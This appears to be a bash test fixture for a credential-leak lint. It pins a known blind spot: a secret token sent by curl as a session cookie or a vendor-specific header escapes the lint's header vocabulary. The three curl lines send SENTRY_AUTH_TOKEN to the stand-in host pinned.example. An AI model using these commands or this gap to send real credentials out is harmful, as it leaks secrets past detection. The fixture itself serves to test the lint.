#!/usr/bin/env bash
set -uo pipefail

case "$-" in
  *x*)
    if [ -n "${SENTRY_AUTH_TOKEN:+x}" ]; then
      printf "[FATAL] refusing to trace with SENTRY_AUTH_TOKEN set (#7797)\n" >&2
      exit 78
    fi
    ;;
esac

# PINNED BLIND SPOT (xfail, not an evasion to pretend away): Rule E's vocabulary is the
# four header NAMES plus apikey:. A session cookie and a vendor-specific custom header carry
# credentials the lint does NOT recognise, so this file reads clean (rc 0). The suite pins
# that verdict so widening the vocabulary is a visible edit here, never a silent drift.
readonly SINK_URL_PINNED="https://pinned.example/ingest"
SINK_URL="${FIXTURE_SINK_URL:-$SINK_URL_PINNED}"
if [ "$SINK_URL" != "https://pinned.example/ingest" ]; then
  printf 'refusing an unpinned destination\n' >&2
  exit 2
fi

curl --disable --noproxy '*' -sS -b "session=${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "Cookie: s=${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "x-gitlab-token: ${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
